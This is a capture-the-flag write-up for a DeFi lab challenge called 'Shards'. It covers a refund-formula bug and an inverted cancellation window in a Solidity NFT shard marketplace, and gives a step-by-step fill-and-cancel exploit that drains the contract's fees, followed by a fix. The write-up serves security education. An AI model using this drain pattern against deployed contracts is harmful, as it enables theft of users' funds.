# Challenge #15: Shards

- **Difficulty:** Medium
- **Category:** Refund Formula Bug / Timing Window
- **Severity:** High
- **Status:** SOLVED ✅

## Overview

`ShardsNFTMarketplace` sells NFT offers as fungible "shards." Users fill offers by purchasing shards, and can cancel their purchase to receive a refund. The marketplace charges a fee on fills.

## Vulnerabilities

### Bug 1: Inflated Refund Formula

The `cancel()` refund calculation is disconnected from the original purchase economics:

```solidity
uint256 refund = purchase.shards * purchase.rate / 1e6;
// ↑ Uses purchase.rate but ignores offer.totalShards and actual price paid
```

This formula can return **more tokens than originally paid** when the rate is high relative to the offer price.

### Bug 2: Inverted Cancellation Window

The cancellation timing check allows **immediate** cancellation instead of requiring a waiting period:

```solidity
// Window is effectively open from the start
// Should require cancellation AFTER a delay, not before
```

## Exploit Walkthrough

```solidity
// Step 1: Buy minimum shards at zero effective cost
uint256 FREE_WANT = 133;
market.fill(OFFER_ID, FREE_WANT);

// Step 2: Cancel immediately for outsized refund
market.cancel(OFFER_ID, 0);
// Refund > cost due to broken formula — we now have DVT to fund next attack

// Step 3: Approve DVT back to marketplace
token.approve(address(market), type(uint256).max);

// Step 4: Make another large purchase with minimal cost
uint256 DRAIN_WANT = 9_999_999_867;
market.fill(OFFER_ID, DRAIN_WANT);

// Step 5: Cancel again for massive refund
market.cancel(OFFER_ID, 1);
// Drains virtually all marketplace fees

// Step 6: Send recovered tokens to recovery
token.transfer(recovery, token.balanceOf(player));
```

The refund formula acts as a **faucet**: buying a tiny amount and canceling returns more than was paid, bootstrapping capital for larger drains.

## Real-World Impact

NFT marketplace pricing bugs are common. **Sudoswap** had multiple AMM curve calculation bugs. **Blur's** early marketplace had refund timing issues. The pattern of **asymmetric economic formulas** (different math for buy vs. sell/refund) has caused losses across DeFi.

## Remediation

```solidity
// FIX: Use consistent economic formula for fills and refunds
function cancel(uint256 offerId, uint256 purchaseIndex) external {
    Purchase memory purchase = offers[offerId].purchases[purchaseIndex];
    
    // Refund should be proportional to actual tokens contributed
    uint256 refund = purchase.tokensContributed;  // Track this on fill
    
    // Enforce proper cancellation window
    require(block.timestamp >= purchase.timestamp + CANCEL_DELAY, "Too early");
    require(block.timestamp <= purchase.timestamp + CANCEL_WINDOW, "Too late");
    
    // Remove purchase and refund
    token.transfer(msg.sender, refund);
}
```

## Key Takeaway

> **Refund formulas must use the same economic model as the original transaction. Any asymmetry between what users pay and what they get back on cancellation creates an exploitable arbitrage. Track actual contributions, not derived values.**
